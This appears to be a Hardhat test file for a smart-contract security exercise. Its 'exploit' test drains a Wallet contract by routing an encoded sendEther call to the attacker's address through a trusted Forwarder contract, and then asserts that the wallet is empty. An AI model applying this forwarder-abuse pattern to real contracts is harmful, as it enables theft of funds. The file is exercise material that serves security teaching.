const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const WALLET_NAME = "Wallet";
const FORWARDER_NAME = "Forwarder";
const NAME = "Forwarder tests";

describe(NAME, function () {
    async function setup() {
        const [, attackerWallet] = await ethers.getSigners();
        const value = ethers.utils.parseEther("1");

        const forwarderFactory = await ethers.getContractFactory(FORWARDER_NAME);
        const forwarderContract = await forwarderFactory.deploy();

        const walletFactory = await ethers.getContractFactory(WALLET_NAME);
        const walletContract = await walletFactory.deploy(forwarderContract.address, { value: value });

        return { walletContract, forwarderContract, attackerWallet };
    }

    describe("exploit", async function () {
        let walletContract, forwarderContract, attackerWallet, attackerWalletBalanceBefore;
        before(async function () {
            ({ walletContract, forwarderContract, attackerWallet } = await loadFixture(setup));
            attackerWalletBalanceBefore = await ethers.provider.getBalance(attackerWallet.address);
        });

        it("conduct your attack here", async function () {
            const functionSignature = "sendEther(address,uint256)";
            const functionSelector = ethers.utils.id(functionSignature).slice(0, 10);

            // Manually encode the arguments
            const encodedArgs = ethers.utils.defaultAbiCoder.encode(
                ["address", "uint256"],
                [attackerWallet.address, ethers.utils.parseEther("1")]
            );

            // Combine the selector and encoded arguments
            const data = functionSelector + encodedArgs.slice(2);

            await forwarderContract.functionCall(walletContract.address, data);
        });

        after(async function () {
            const attackerWalletBalanceAfter = await ethers.provider.getBalance(attackerWallet.address);
            expect(attackerWalletBalanceAfter.sub(attackerWalletBalanceBefore)).to.be.closeTo(
                ethers.utils.parseEther("1"),
                1000000000000000
            );

            const walletContractBalance = await ethers.provider.getBalance(walletContract.address);
            expect(walletContractBalance).to.be.equal("0");
        });
    });
});
